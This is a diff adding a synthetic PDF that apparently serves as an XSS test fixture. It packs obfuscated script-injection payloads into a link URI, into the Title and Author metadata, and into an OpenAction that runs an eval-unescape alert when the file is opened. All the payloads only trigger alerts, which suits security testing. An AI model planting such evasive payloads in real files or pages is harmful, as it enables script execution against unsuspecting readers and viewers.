@@ -1,0 +1,48 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 11 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >>
+endobj
+4 0 obj
+<< /Type /Annot /Subtype /Link /Rect [50 750 200 770]
+/A << /S /URI /URI (java\u0073cript:/*x*/alert`XSS_UR`+`I`) >>
+/Contents (Stealth XSS test)
+/Title (&#x3C;img src&#x3D;x onerror&#x3D;prompt(1)&#x3E;)
+>>
+endobj
+5 0 obj
+<< /Title (Normal Title) /Author (&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(3)//) >>
+endobj
+6 0 obj
+<< /Producer (PDF-XSS) >>
+endobj
+10 0 obj
+<< /Type /Filespec /F (safe.pdf) >>
+endobj
+11 0 obj
+<< /S /JavaScript /JS (eval(unescape('%61%6C%65%72%74%28%27%58%53%53%5F%4F%50%45%4E%41%43%54%49%4F%4E%27%29'))) >>
+endobj
+xref
+0 12
+0000000000 65535 f 
+0000000009 00000 n 
+0000000109 00000 n 
+0000000209 00000 n 
+0000000309 00000 n 
+0000000409 00000 n 
+0000000509 00000 n 
+0000000609 00000 n 
+0000000709 00000 n 
+0000000809 00000 n 
+0000000909 00000 n 
+0000001009 00000 n 
+trailer
+<< /Root 1 0 R /Info 5 0 R /Size 12 >>
+startxref
+780
+%%EOF
